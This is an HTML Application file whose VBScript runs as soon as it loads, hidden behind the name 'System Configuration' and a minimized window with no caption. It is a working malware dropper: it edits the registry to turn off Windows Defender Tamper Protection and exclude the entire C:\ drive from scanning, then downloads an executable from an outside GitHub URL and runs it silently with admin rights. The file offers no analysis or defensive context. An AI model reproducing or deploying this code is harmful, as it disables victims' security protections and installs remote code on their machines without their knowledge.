<html>
<head>
<HTA:APPLICATION
  ID="oMyApp"
  APPLICATIONNAME="System Configuration"
  BORDER="none"
  CAPTION="no"
  SHOWINTASKBAR="no"
  SINGLEINSTANCE="yes"
  SYSMENU="no"
  WINDOWSTATE="minimize">
<script language="VBScript">
    Sub Window_OnLoad
        On Error Resume Next

        ' --- Configuration ---
        ' IMPORTANT: Use the direct raw download link for the exe file.
        Dim exeURL: exeURL = "https://raw.githubusercontent.com/mal662/klsvxb/refs/heads/main/procexp64.exe"
        Dim exePath: exePath = "C:\Windows\Temp\procexp64.exe"
        ' --- End Configuration ---

        Dim objShell, http, ado

        ' Step 1: Disable Windows Defender Tamper Protection
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v TamperProtection /t REG_DWORD /d 0 /f", 0, True
        objShell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Features"" /v TamperProtection /t REG_DWORD /d 0 /f", 0, True

        ' Step 2: Pause to allow the system to apply the Tamper Protection change.
        ' This ensures the registry is unlocked before the next command.
        WScript.Sleep 2000 ' 2-second delay

        ' Step 3: Add C:\ drive to Windows Defender Exclusions via Registry
        ' This command will now succeed because Tamper Protection is disabled.
        objShell.Run "reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"" /v C:\ /t REG_DWORD /d 0 /f", 0, True

        ' Step 4: Download the executable file (AFTER exclusion is in place)
        Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
        http.open "GET", exeURL, False
        http.send

        If http.Status = 200 Then
            Set ado = CreateObject("ADODB.Stream")
            ado.Type = 1 'adTypeBinary
            ado.Open
            ado.Write http.ResponseBody
            ado.SaveToFile exePath, 2 'adSaveCreateOverwrite
            ado.Close

            ' Step 5: Run the downloaded executable silently with inherited admin rights
            objShell.Run chr(34) & exePath & chr(34), 0, False
        End If

        ' Step 6: Close the HTA window
        Window.Close
    End Sub
</script>
</head>
<body>
</body>
</html>
